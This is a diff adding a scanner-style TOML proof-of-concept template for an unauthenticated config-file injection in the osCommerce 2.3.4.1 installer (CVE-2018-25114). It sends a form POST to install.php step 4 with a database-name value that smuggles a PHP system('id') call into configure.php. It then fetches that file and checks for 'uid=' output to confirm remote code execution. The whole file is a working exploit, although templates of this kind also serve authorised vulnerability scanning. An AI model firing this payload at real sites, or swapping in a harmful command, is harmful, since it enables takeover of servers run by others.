@@ -1,0 +1,39 @@
+[info]
+id = "POC-AVE-2018-0043"
+name = "osCommerce 2.3.4.1 Installer Unauthenticated Config File Injection PoC"
+author = "AVE"
+severity = "critical"
+tags = ["rce", "code-injection", "oscommerce"]
+description = "osCommerce 2.3.4.1安装程序未经验证的配置文件注入，通过install_4.php将PHP代码注入configure.php实现远程代码执行"
+vuln_id = ["CVE-2018-25114", "AVE-2018-0043"]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/install/install.php"
+query.step = "4"
+body.type = "form"
+body.DIR_FS_DOCUMENT_ROOT = "./"
+body.DB_DATABASE = "');system('id');/*"
+
+[[poc.requests.matchers]]
+type = "status"
+status = [200]
+expect = true
+
+[[poc.requests]]
+method = "GET"
+path = "/install/includes/configure.php"
+
+[[poc.requests.matchers]]
+type = "status"
+status = [200]
+expect = true
+
+[[poc.requests.matchers]]
+type = "word"
+part = "body"
+words = ["uid="]
+expect = true
